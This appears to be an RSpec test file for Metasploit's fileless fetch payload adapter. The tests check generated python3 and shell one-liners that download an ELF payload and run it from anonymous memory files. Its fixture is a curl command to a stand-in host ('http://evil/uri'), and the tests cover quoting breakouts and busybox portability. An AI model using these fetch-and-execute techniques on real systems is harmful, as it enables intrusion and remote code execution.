require 'spec_helper'
require 'tempfile'

RSpec.describe Msf::Payload::Adapter::Fetch::Fileless do
  let(:harness_class) do
    Class.new do
      include Msf::Payload::Adapter::Fetch::Fileless
    end
  end

  subject(:harness) { harness_class.new }

  # Representative of the get_file_cmd curl/wget build when FETCH dynamic_arch is
  # enabled: it contains a literal single quote plus other shell metacharacters
  # ($, &). Embedded unencoded, that quote previously closed the python3 -c '...'
  # argument early and broke out into raw shell syntax.
  let(:get_file_cmd) { 'curl -so /tmp/x http://evil/uri?arch=$(uname -m)\&endian=$(printf %d \'$(head -c6 /bin/sh|tail -c1))' }

  describe '#_generate_fileless_python' do
    subject(:cmd) { harness._generate_fileless_python(get_file_cmd) }

    it 'never embeds get_file_cmd verbatim in the generated one-liner' do
      expect(cmd).not_to include(get_file_cmd)
    end

    it 'base64-decodes back to the exact original get_file_cmd' do
      encoded = cmd[/b64decode\("([^"]+)"\)/, 1]
      expect(encoded).not_to be_nil
      expect(Base64.strict_decode64(encoded)).to eq(get_file_cmd)
    end

    it 'keeps the python -c argument as a single balanced single-quoted string' do
      # The only single quotes in the whole command must be the two delimiting
      # `python3 -c '...'`. If get_file_cmd's own single quote (or any other
      # metacharacter) leaked in unencoded, this count would be higher and the
      # command would break out of the intended python argument.
      expect(cmd.count("'")).to eq(2)
      expect(cmd).to match(/\Apython3 -c '.*'\z/)
    end

    it 'decodes and runs get_file_cmd through the shell via os.system' do
      expect(cmd).to include('os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";{get_file_cmd};$f&")')
    end
  end

  describe '#_generate_fileless_bash_search' do
    subject(:cmd) { harness._generate_fileless_bash_search(get_file_cmd) }

    it 'embeds get_file_cmd directly, since the surrounding script text is unquoted' do
      expect(cmd).to include("if (#{get_file_cmd}) >/dev/null")
    end

    it 'wraps get_file_cmd in a subshell so the trailing >/dev/null cannot clobber a redirect get_file_cmd embeds itself' do
      # get_file_cmd can itself end in a raw `>$dest` redirect (e.g. the
      # plain GET-based fetch command). Appending ` >/dev/null` directly
      # after that, unparenthesized, would silently win and the payload
      # would never be written to the candidate file.
      expect(cmd).not_to include("#{get_file_cmd} >/dev/null")
    end

    it 'checks the real exit status of get_file_cmd rather than a swallowed command substitution' do
      # $(get_file_cmd >/dev/null) always captures an empty string (stdout is
      # redirected away inside the substitution), and `if <empty>` is always
      # true in bash regardless of whether get_file_cmd actually succeeded.
      expect(cmd).not_to include("$(#{get_file_cmd}")
    end

    it 'verifies the candidate anonymous file actually holds a downloaded ELF, not just any pre-existing content' do
      # A candidate fd can pass the memfd/rwx filter yet belong to an unrelated
      # process with its own real (non-empty) data already in it -- a bare
      # exit-status or size check can't tell "our payload landed here" apart
      # from "there was already unrelated data here we couldn't overwrite".
      expect(cmd).to include(%q{[ "$(dd if=$f bs=1 count=4 2>/dev/null)" = "$(printf '\177ELF')" ]})
    end

    it 'does not depend on od or head -c, neither of which is guaranteed present/POSIX-mandated on minimal/embedded busybox builds' do
      expect(cmd).not_to include('od ')
      expect(cmd).not_to include('head -c4 $f')
    end

    it 'exits the whole script on a successful match rather than merely breaking the search loop' do
      # A bare `break` only exits the innermost loop -- when this search
      # script is concatenated with a fallback (as _execute_nix's shell-search
      # branch does), a successful match must terminate the entire script via
      # `exit`, or the fallback below would run again and re-download/re-exec
      # the payload a second time.
      expect(cmd).not_to include('; break')
    end
  end

  describe '#_generate_fileless_shell' do
    subject(:cmd) { harness._generate_fileless_shell(get_file_cmd, 'mipsle') }

    it 'embeds get_file_cmd directly, since the surrounding script text is unquoted' do
      expect(cmd).to include("then if (#{get_file_cmd}) >/dev/null")
    end

    it 'wraps get_file_cmd in a subshell so the trailing >/dev/null cannot clobber a redirect get_file_cmd embeds itself' do
      expect(cmd).not_to include("#{get_file_cmd} >/dev/null")
    end

    it 'checks the real exit status of get_file_cmd rather than a swallowed command substitution' do
      expect(cmd).not_to include("$(#{get_file_cmd}")
    end

    it 'verifies the candidate anonymous file actually holds a downloaded ELF' do
      expect(cmd).to include(%q{[ "$(dd if=$f bs=1 count=4 2>/dev/null)" = "$(printf '\177ELF')" ]})
    end

    it 'does not depend on od or head -c, neither of which is guaranteed present/POSIX-mandated on minimal/embedded busybox builds' do
      expect(cmd).not_to include('od ')
      expect(cmd).not_to include('head -c4 $f')
    end
  end

  describe '#_hex_byte_swap_shell' do
    def swapped_hex(padded_hex)
      padded_hex.scan(/../).reverse.join
    end

    # Actually runs the generated shell fragment (with $vdso_addr set) through
    # `sh`, bounded by `timeout` so a regression back to the pre-fix infinite
    # loop fails the example instead of hanging the suite.
    def run_fragment(width, vdso_addr)
      fragment = harness._hex_byte_swap_shell(width)
      Tempfile.create('hex_byte_swap_probe') do |f|
        f.write("vdso_addr=#{vdso_addr}\necho #{fragment}\n")
        f.flush
        `timeout 2 sh #{f.path}`.strip
      end
    end

    it 'reverses byte order of an address that exactly fits the padded width' do
      result = run_fragment(8, 0x12345678)
      expect(result).to eq(swapped_hex('12345678'))
    end

    it 'terminates and produces the correctly byte-swapped result when the address needs more digits than the padded width' do
      # printf %04x on 0x10000 yields "10000" -- 5 (odd) hex digits, since
      # printf only pads *up to* the given width, it doesn't clip larger
      # values down to it. The old, unguarded ${v%??} trim loop assumed an
      # always-even-length string and spun forever once it reached the last
      # single leftover character; the `timeout` wrapper here turns that
      # regression into a failing example instead of a hung spec run.
      vdso_addr = 0x10000
      result = run_fragment(4, vdso_addr)
      expect(result).to eq(swapped_hex('010000'))
    end
  end
end
